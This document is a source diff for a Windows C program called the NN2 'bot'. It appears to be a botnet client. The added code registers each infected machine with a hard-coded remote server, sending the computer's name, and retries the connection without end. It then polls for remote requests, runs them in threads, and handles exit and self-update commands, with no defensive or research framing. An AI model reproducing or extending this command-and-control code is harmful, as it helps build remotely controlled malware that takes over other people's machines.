@@ -6,7 +6,9 @@ void bot_startup(char *host, unsigned long request_time)
     SSL_CTX *ssl_ctx = NULL;
     https_conn_t https;
     int r = 0;
+    int rsize;
     char request[1024];
+    char connect_request[512];
     char recv_buf[RECV_BUF_SZ];
     unsigned long long timer;
 
@@ -18,9 +20,12 @@ void bot_startup(char *host, unsigned long request_time)
     r = new_https(host, ssl_ctx, &https);
     if(r == -1)
     {
-        fatalOSSL("while connecting to server", ERR_get_error());
-        SSL_CTX_free(ssl_ctx);
-        return;
+        while(r == -1)
+        {
+            printf("Connection to server failed\n");
+            Sleep(1000);
+            r = new_https(host, ssl_ctx, &https);
+        }
     }
 
     init_requests();
@@ -30,6 +35,7 @@ void bot_startup(char *host, unsigned long request_time)
     mx_req_count = PTHREAD_MUTEX_INITIALIZER;
     mx_req_threads = PTHREAD_MUTEX_INITIALIZER;
     mx_bot_id = PTHREAD_MUTEX_INITIALIZER;
+    mx_signal_queue = PTHREAD_MUTEX_INITIALIZER;
     mx_req_queue = PTHREAD_MUTEX_INITIALIZER;
 
     /*** Request queue ***/
@@ -43,17 +49,37 @@ void bot_startup(char *host, unsigned long request_time)
     }
 
     /*** Connection to server ***/
-    bot_id = 5;
-
     printf("All is initialized, connecting to server...\n");
-    strcpy(request, "GET /bot.php?id=5 HTTP/1.0\r\n");
+
+    char name[128];
+    DWORD name_sz = 128;
+    if(GetComputerName(name, &name_sz) == 0)
+    {
+        strcpy(name, "null");
+    }
+
+    sprintf(connect_request, "GET /connect.php?r=connect&n=%s HTTP/1.0\r\n", name);
+    strcat(connect_request, "Host: nonameufr.alwaysdata.net\r\n");
+    strcat(connect_request, "User-Agent: NN2 Windows\r\n");
+    strcat(connect_request, "\r\n");
+    rsize = https_request(&https, connect_request, strlen(connect_request), recv_buf, RECV_BUF_SZ);
+    while(rsize <= 0)
+    {
+        fprintf(stderr, "[!!] Failed to send connection request to server. (retrying)\n");
+        Sleep(1000);
+        rsize = https_request(&https, connect_request, strlen(connect_request), recv_buf, RECV_BUF_SZ);
+    }
+    char *content = contentheader(recv_buf);
+    sscanf(content, "connected\\\\id=%d", &bot_id);
+    printf("Connected to server, id : %d\n", bot_id);
+
+    sprintf(request, "GET /bot.php?id=%d HTTP/1.0\r\n", bot_id);
     strcat(request, "Host: nonameufr.alwaysdata.net\r\n");
     strcat(request, "User-Agent: NN2 Windows\r\n");
     strcat(request, "\r\n");
 
     printf("Waiting for requests...\n");
     timer = current_time_millis();
-    int rsize;
     while(1)
     {
         if((current_time_millis() - timer) > request_time)
@@ -63,6 +89,7 @@ void bot_startup(char *host, unsigned long request_time)
             rsize = https_request(&https, request, strlen(request), recv_buf, RECV_BUF_SZ);
             if(rsize <= 0)
             {
+                printf("Server error (connection failed)\n");
                 continue;
             }
 
@@ -70,9 +97,44 @@ void bot_startup(char *host, unsigned long request_time)
 
             //printf("Received : %s\n\n", recv_buf);
             r = analyse_recv(recv_buf, rsize);
+            if(r == 2)
+            {
+                rsize = https_request(&https, connect_request, strlen(connect_request), recv_buf, RECV_BUF_SZ);
+                while(rsize <= 0)
+                {
+                    fprintf(stderr, "[!!] Failed to send connection request to server. (retrying)\n");
+                    Sleep(1000);
+                    rsize = https_request(&https, connect_request, strlen(connect_request), recv_buf, RECV_BUF_SZ);
+                }
+                content = contentheader(recv_buf);
+                sscanf(content, "connected\\\\id=%d", &bot_id);
+                printf("Reconnected to server, id : %d\n", bot_id);
+
+                sprintf(request, "GET /bot.php?id=%d HTTP/1.0\r\n", bot_id);
+                strcat(request, "Host: nonameufr.alwaysdata.net\r\n");
+                strcat(request, "User-Agent: NN2 Windows\r\n");
+                strcat(request, "\r\n");
+                continue;
+            }
+        }
+        r = check_signal_queue();
+        if(r == -2)
+        {
+            break;
+        } else if(r == 1)
+        {
+            break;
         }
         check_queue();
         Sleep(50);
+    }
+    if(r == 1)
+    {
+        https_close(&https);
+        SSL_CTX_free(ssl_ctx);
+        //update signal
+        bot_update(host);
+        return;
     }
 
     https_close(&https);
@@ -84,9 +146,10 @@ void bot_cleanup(char *host)
     SSL_CTX *ssl_ctx = NULL;
     https_conn_t https;
     char request[1024];
+    char recv_buf[512];
     int r;
 
-    printf("Terminating bot...");
+    printf("Terminating bot...\n");
     init_ssl();
 
     ssl_ctx = SSL_CTX_new(SSLv23_client_method());
@@ -97,14 +160,6 @@ void bot_cleanup(char *host)
         SSL_CTX_free(ssl_ctx);
         return;
     }
-
-    sprintf(request, "GET /connect.php?r=disconnect&id=%d HTTP/1.0\r\n", bot_id);
-    strcat(request, "Host: nonameufr.alwaysdata.net\r\n");
-    strcat(request, "User-Agent: NN2 Windows\r\n");
-    strcat(request, "\r\n");
-
-    printf("Sending disconnection signal to server...");
-    //Send disconnection request
 
     int st_req_count = get_req_count();
     if(st_req_count != 0)
@@ -145,6 +200,7 @@ void bot_cleanup(char *host)
     pthread_mutex_destroy(&mx_req_count);
     pthread_mutex_destroy(&mx_req_queue);
     pthread_mutex_destroy(&mx_req_threads);
+    pthread_mutex_destroy(&mx_signal_queue);
 
     /*** Request queue ***/
     if(req_queue.length != 0)
@@ -163,17 +219,32 @@ void bot_cleanup(char *host)
     }
     free_array(&req_queue);
 
+    /*** Sending disconnection request to server ***/
+    sprintf(request, "GET /connect.php?r=disconnect&id=%d HTTP/1.0\r\n", bot_id);
+    strcat(request, "Host: nonameufr.alwaysdata.net\r\n");
+    strcat(request, "User-Agent: NN2 Windows\r\n");
+    strcat(request, "\r\n");
+
+    printf("Sending disconnection request to server...\n");
+    int ret = https_request(&https, request, strlen(request), recv_buf, 512);
+    if(ret <= 0)
+    {
+        fprintf(stderr, "[!!] Failed to send disconnection request.\n");
+    }
+
     /*** Releasing connection data ***/
     https_close(&https);
     SSL_CTX_free(ssl_ctx);
 
     printf("Terminated.\n");
+    close_log();
 }
 
 /*********
 *** -2 -> Exit signal
 ***  0 -> Requests executed without problems
 ***  1 -> No requests
+***  2 -> Need reconnection
 *********/
 int analyse_recv(char *recv_buf, size_t recv_sz)
 {
@@ -212,6 +283,18 @@ int analyse_recv(char *recv_buf, size_t recv_sz)
     if(startwith("error", content) == 0)
     {
         fprintf(stderr, "\tServer error (raw=\"%s\").\n", content);
+        token = strtok(content, "\\\\");
+        token = strtok(NULL, "\\\\");
+        if(token != NULL)
+        {
+            int code = atoi(token);
+            printf("Error code : %d\n", code);
+            if(code == 1)
+            {
+                fprintf(stderr, "\tServer error (reconnection).\n");
+                return 2;
+            }
+        }
         return -1;
     }
 
@@ -221,6 +304,11 @@ int analyse_recv(char *recv_buf, size_t recv_sz)
     {
         //printf("Request %d : %s\n", i, token);
         char *params[32];
+        int j;
+        for(j = 0; j<32; j++)
+        {
+            params[j] = NULL;
+        }
         int params_count;
 
         strcpy(buffer, token);
@@ -323,6 +411,10 @@ void parse_recv(char *req, char **out_params, int *params_count)
     for(i = 0; i<params_nb; i++)
     {
         token = strtok(NULL, "\\\\");
+        if(token == NULL)
+        {
+            break;
+        }
         char *param = (char *) malloc(strlen(token)+1);
         if(param == NULL)
         {
@@ -332,6 +424,14 @@ void parse_recv(char *req, char **out_params, int *params_count)
         }
         strcpy(param, token);
         out_params[i] = param;
+    }
+
+    for(i = 0; i<params_nb; i++)
+    {
+        if(out_params[i] == NULL)
+        {
+            params_nb--;
+        }
     }
 
     *params_count = params_nb;
@@ -415,6 +515,48 @@ void check_queue()
     {
         pthread_mutex_unlock(&mx_req_queue);
     }
+}
+
+/****
+***  0 -> Nothing to do
+*** -2 -> Exit signal
+***  1 -> Update signal
+****/
+int check_signal_queue()
+{
+    pthread_mutex_lock(&mx_signal_queue);
+    int st_length = signal_queue.length;
+
+    if(st_length > 0)
+    {
+        int i;
+        for(i = 0; i<st_length; i++)
+        {
+            nn_req_signal_t signal;
+            get_item_signal(&signal_queue, i, &signal);
+
+            if(signal._to == RSIG_TO_MAIN)
+            {
+                if(signal._sig == RSIG_SIG_EXIT)
+                {
+                    pthread_mutex_unlock(&mx_signal_queue);
+                    return -2;
+                } else if(signal._sig == RSIG_SIG_UPDATE)
+                {
+                    pthread_mutex_unlock(&mx_signal_queue);
+                    return 1;
+                }
+            } else
+            {
+                //todo
+            }
+        }
+        signal_queue.length = 0;
+    }
+
+    pthread_mutex_unlock(&mx_signal_queue);
+
+    return 0;
 }
 
 void *request_thread_func(void *arg)
